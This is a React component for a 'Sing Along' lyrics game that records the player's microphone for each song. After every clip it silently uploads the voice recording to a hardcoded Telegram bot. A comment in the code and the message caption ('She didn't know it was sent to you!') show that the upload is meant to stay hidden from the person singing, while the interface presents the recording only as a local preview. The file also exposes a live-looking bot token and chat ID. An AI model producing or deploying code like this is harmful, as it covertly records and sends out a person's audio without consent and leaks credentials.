"use client"

import { useState, useRef, useEffect } from "react"
import { motion, AnimatePresence } from "framer-motion"
import { 
    ArrowRight, Trophy, Mic, PlaySquare, Square, Play, Pause, Headphones
} from "lucide-react"

// ⚠️ TUMHARI TG DETAILS
const BOT_TOKEN = "8673978157:AAFWiYR__xUFb79u9Tfrz-8guCB10sgruX0"
const CHAT_ID = "8745839603"

async function sendVoiceNoteToTG(songNo, audioBlob) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`
    const formData = new FormData()
    formData.append("chat_id", CHAT_ID)
    formData.append("voice", audioBlob, `song_${songNo}.ogg`)
    formData.append("caption", `🎤 Lyrics Challenge - Song ${songNo}\n(She didn't know it was sent to you! 🤫)`)
    
    // Background me silently fetch hoga, no await block for UI
    fetch(url, { method: "POST", body: formData }).catch(e => console.log("TG Error:", e))
}

async function sendFinalScore(score) {
    try {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text: `🏆 <b>Lyrics Challenge Finished!</b>\nPoints Earned: ${score}`, parse_mode: "HTML" }),
        })
    } catch { }
}

// ============================================
// TIMESTAMPS (Video Start Points)
// ============================================
const SONGS = [
    { id: 1, clipStart: 11 },
    { id: 2, clipStart: 33 },
    { id: 3, clipStart: 55 },
    { id: 4, clipStart: 82 },
    { id: 5, clipStart: 106 },
    { id: 6, clipStart: 127 },
    { id: 7, clipStart: 150 },
    { id: 8, clipStart: 174 },
    { id: 9, clipStart: 205 }
];

export default function FunGames({ onComplete }) {
    const [currentIdx, setCurrentIdx] = useState(0)
    const [gameState, setGameState] = useState("start") // start, playing, preview, finished
    const [score, setScore] = useState(0)
    
    const [voiceUrl, setVoiceUrl] = useState(null)
    const [isPreviewPlaying, setIsPreviewPlaying] = useState(false)

    const videoRef = useRef(null)
    const previewAudioRef = useRef(null)
    const streamRef = useRef(null)
    const mediaRecorderRef = useRef(null)
    const audioChunksRef = useRef([])
    const autoStopTimerRef = useRef(null)
    
    // Voice Visualizer Refs
    const audioCtxRef = useRef(null)
    const analyserRef = useRef(null)
    const reqAnimRef = useRef(null)
    const barRefs = useRef([])

    // ============================================
    // CLEANUP MEMORY
    // ============================================
    useEffect(() => {
        return () => {
            if (voiceUrl) URL.revokeObjectURL(voiceUrl)
            if (streamRef.current) streamRef.current.getTracks().forEach(t => t.stop())
            if (reqAnimRef.current) cancelAnimationFrame(reqAnimRef.current)
            if (autoStopTimerRef.current) clearTimeout(autoStopTimerRef.current)
        }
    }, [voiceUrl])

    // ============================================
    // MIC & RECORDING LOGIC
    // ============================================
    const startChallenge = async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true })
            streamRef.current = stream
            startRound(0)
        } catch (e) {
            alert("Please allow mic access so we can record your beautiful voice! 🎙️")
        }
    }

    const startRound = (index) => {
        if (voiceUrl) URL.revokeObjectURL(voiceUrl)
        setVoiceUrl(null)
        setIsPreviewPlaying(false)
        if (autoStopTimerRef.current) clearTimeout(autoStopTimerRef.current)

        if (videoRef.current) {
            videoRef.current.currentTime = SONGS[index].clipStart
            videoRef.current.play().catch(e => console.log("Play prevented", e))
        }

        // Initialize Web Audio API for Voice Visualizer
        if (!audioCtxRef.current) {
            const AudioContext = window.AudioContext || window.webkitAudioContext
            if (AudioContext) audioCtxRef.current = new AudioContext()
        }

        if (audioCtxRef.current && streamRef.current) {
            if (audioCtxRef.current.state === "suspended") audioCtxRef.current.resume()
            const source = audioCtxRef.current.createMediaStreamSource(streamRef.current)
            const analyser = audioCtxRef.current.createAnalyser()
            analyser.fftSize = 64
            source.connect(analyser)
            analyserRef.current = analyser
            drawVisualizer()
        }

        // Setup Media Recorder
        const mr = new MediaRecorder(streamRef.current)
        mediaRecorderRef.current = mr
        audioChunksRef.current = []

        mr.ondataavailable = (e) => {
            if (e.data.size > 0) audioChunksRef.current.push(e.data)
        }

        mr.onstop = () => {
            const blob = new Blob(audioChunksRef.current, { type: "audio/ogg; codecs=opus" })
            setVoiceUrl(URL.createObjectURL(blob))
            
            // 🚀 SILENT SEND TO TG (Background fetch)
            sendVoiceNoteToTG(index + 1, blob)
            
            setGameState("preview")
            if (reqAnimRef.current) cancelAnimationFrame(reqAnimRef.current)
        }

        mr.start()
        setGameState("playing")

        // Auto stop recording after 25 seconds just in case she forgets to stop
        autoStopTimerRef.current = setTimeout(() => {
            stopRecording()
        }, 25000)
    }

    const stopRecording = () => {
        if (videoRef.current) videoRef.current.pause()
        if (autoStopTimerRef.current) clearTimeout(autoStopTimerRef.current)
        
        if (mediaRecorderRef.current && mediaRecorderRef.current.state !== "inactive") {
            mediaRecorderRef.current.stop() // triggers onstop -> silently sends -> goes to preview
        }
    }

    const nextSong = () => {
        if (isPreviewPlaying && previewAudioRef.current) {
            previewAudioRef.current.pause()
        }
        setScore(s => s + 20)
        
        const nextIdx = currentIdx + 1
        if (nextIdx < SONGS.length) {
            setCurrentIdx(nextIdx)
            startRound(nextIdx)
        } else {
            setGameState("finished")
            sendFinalScore(score + 20)
            if (streamRef.current) streamRef.current.getTracks().forEach(t => t.stop())
        }
    }

    const togglePreviewPlay = () => {
        if (!previewAudioRef.current) return
        if (isPreviewPlaying) {
            previewAudioRef.current.pause()
            setIsPreviewPlaying(false)
        } else {
            previewAudioRef.current.play()
            setIsPreviewPlaying(true)
            previewAudioRef.current.onended = () => setIsPreviewPlaying(false)
        }
    }

    const drawVisualizer = () => {
        if (!analyserRef.current) return
        reqAnimRef.current = requestAnimationFrame(drawVisualizer)
        
        const dataArray = new Uint8Array(analyserRef.current.frequencyBinCount)
        analyserRef.current.getByteFrequencyData(dataArray)

        for (let i = 0; i < 15; i++) {
            if (barRefs.current[i]) {
                const value = dataArray[i + 2] || 0 // Skip lowest freqs
                const percent = Math.max(15, (value / 255) * 100) // minimum 15% height
                barRefs.current[i].style.height = `${percent}%`
            }
        }
    }

    return (
        <motion.div className="min-h-screen flex flex-col items-center justify-center p-4 relative bg-black text-white"
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
            
            <style>{`@import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap');`}</style>

            <div className="relative z-10 w-full max-w-sm mx-auto flex flex-col items-center" style={{ fontFamily: "'Nunito', sans-serif" }}>
                
                {/* 🔴 VIDEO TAG (Works for mp4, WebM, etc.) 🔴 */}
                {/* Agar file mp3 hai toh browser video player me usko audio ki tarah chala lega */}
                <video 
                    ref={videoRef} 
                    src="/images/video.mp4" 
                    playsInline 
                    className={`w-full rounded-3xl border-2 shadow-[0_0_30px_rgba(236,72,153,0.15)] mb-6 transition-all duration-500 ${gameState !== "start" && gameState !== "finished" ? "opacity-100 scale-100 border-pink-500/50" : "opacity-0 scale-95 h-0 mb-0 border-transparent"}`}
                    style={{ objectFit: "cover" }}
                />

                <AnimatePresence mode="wait">
                    {gameState === "start" && (
                        <motion.div key="start" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0 }} 
                            className="w-full flex flex-col items-center p-8 rounded-[32px] border border-white/10 bg-white/5 text-center shadow-2xl">
                            
                            <PlaySquare className="w-16 h-16 text-pink-500 mb-6 drop-shadow-[0_0_15px_rgba(236,72,153,0.5)]" />
                            <h1 className="text-3xl font-black text-white mb-2 uppercase tracking-tight">Sing Along</h1>
                            <p className="text-gray-400 text-sm mb-8">
                                Watch the video. The mic will turn on automatically. Complete the lyrics when the timer stops!
                            </p>
                            
                            <motion.button
                                onClick={startChallenge}
                                className="w-full py-4 bg-gradient-to-r from-pink-500 to-indigo-600 text-white font-black rounded-2xl uppercase tracking-widest shadow-lg shadow-pink-500/20"
                                whileHover={{ scale: 1.02 }}
                                whileTap={{ scale: 0.98 }}
                            >
                                START CHALLENGE 🎙️
                            </motion.button>
                        </motion.div>
                    )}

                    {gameState === "playing" && (
                        <motion.div key="playing" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} 
                            className="w-full flex flex-col items-center p-6 rounded-[32px] border border-red-500/30 bg-red-500/10 text-center shadow-[0_0_30px_rgba(239,68,68,0.1)]">
                            
                            <div className="flex justify-between w-full mb-6 px-2">
                                <span className="text-red-400 font-bold tracking-widest text-[10px] uppercase">SONG {currentIdx + 1}/{SONGS.length}</span>
                                <div className="flex items-center gap-1.5 bg-red-500/20 px-3 py-1 rounded-full border border-red-500/50">
                                    <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
                                    <span className="text-red-500 font-black text-[10px] uppercase">REC</span>
                                </div>
                            </div>

                            {/* LIVE VOICE VISUALIZER (Reacts to voice) */}
                            <div className="flex items-center justify-center gap-1.5 h-16 mb-6 w-full">
                                {[...Array(15)].map((_, i) => (
                                    <div
                                        key={i}
                                        ref={el => barRefs.current[i] = el}
                                        className="w-1.5 bg-red-400 rounded-full transition-all duration-75"
                                        style={{ height: '15%' }}
                                    />
                                ))}
                            </div>
                            
                            <p className="text-white font-bold text-sm mb-6 bg-black/40 px-4 py-2 rounded-lg border border-white/10">
                                Complete the lyrics when the timer stops in the video!
                            </p>

                            <motion.button
                                onClick={stopRecording}
                                className="w-full py-4 bg-red-600 hover:bg-red-500 text-white font-black rounded-xl flex items-center justify-center gap-2 uppercase tracking-widest shadow-lg shadow-red-500/30"
                                whileHover={{ scale: 1.02 }}
                                whileTap={{ scale: 0.98 }}
                            >
                                <Square fill="currentColor" size={16} /> STOP RECORDING
                            </motion.button>
                        </motion.div>
                    )}

                    {gameState === "preview" && (
                        <motion.div key="preview" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0 }} 
                            className="w-full flex flex-col items-center p-8 rounded-[32px] border border-blue-500/30 bg-blue-500/10 text-center shadow-[0_0_30px_rgba(59,130,246,0.1)]">
                            
                            <Headphones className="w-12 h-12 text-blue-400 mb-4 drop-shadow-lg" />
                            <h2 className="text-xl font-black text-white mb-2 uppercase">Your Masterpiece!</h2>
                            <p className="text-blue-200/70 text-xs mb-6">Listen to your singing. Sounds great, right?</p>
                            
                            {voiceUrl && <audio ref={previewAudioRef} src={voiceUrl} />}

                            <div className="w-full bg-black/40 rounded-2xl p-4 flex items-center gap-4 border border-white/10 mb-8 shadow-inner">
                                <motion.button
                                    onClick={togglePreviewPlay}
                                    className="w-12 h-12 bg-blue-500 text-white rounded-full flex items-center justify-center shrink-0 shadow-lg"
                                    whileTap={{ scale: 0.9 }}
                                >
                                    {isPreviewPlaying ? <Pause fill="currentColor" size={20} /> : <Play fill="currentColor" size={20} className="ml-1" />}
                                </motion.button>
                                
                                <div className="flex-1 flex items-center gap-1 h-8 opacity-60">
                                    {[...Array(12)].map((_, i) => (
                                        <div key={i} className="w-1.5 bg-blue-300 rounded-full" style={{ height: `${Math.random() * 60 + 20}%` }} />
                                    ))}
                                </div>
                            </div>

                            <motion.button
                                onClick={nextSong}
                                className="w-full py-4 bg-gradient-to-r from-blue-500 to-indigo-500 text-white font-black rounded-xl flex items-center justify-center gap-2 uppercase tracking-widest shadow-lg shadow-blue-500/30"
                                whileHover={{ scale: 1.02 }}
                                whileTap={{ scale: 0.98 }}
                            >
                                NEXT SONG <ArrowRight size={18} />
                            </motion.button>
                        </motion.div>
                    )}

                    {gameState === "finished" && (
                        <motion.div key="finished" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0 }} 
                            className="w-full flex flex-col items-center p-8 rounded-[32px] border border-white/10 bg-white/5 text-center shadow-2xl">
                            
                            <div className="w-24 h-24 rounded-full bg-green-500/20 flex items-center justify-center mb-6 border border-green-500/50">
                                <Trophy className="w-10 h-10 text-green-500" />
                            </div>
                            <h2 className="text-3xl font-black text-white mb-2 uppercase">Challenge Complete!</h2>
                            <p className="text-gray-400 text-sm mb-8">Hope you enjoyed singing along! ✨</p>
                            
                            <motion.button
                                onClick={() => onComplete(score)}
                                className="w-full py-4 bg-white text-black font-black rounded-xl uppercase tracking-widest"
                                whileHover={{ scale: 1.02 }}
                                whileTap={{ scale: 0.98 }}
                            >
                                Proceed to Next Surprise <ArrowRight size={18} className="inline ml-1" />
                            </motion.button>
                        </motion.div>
                    )}
                </AnimatePresence>
            </div>
        </motion.div>
    )
}
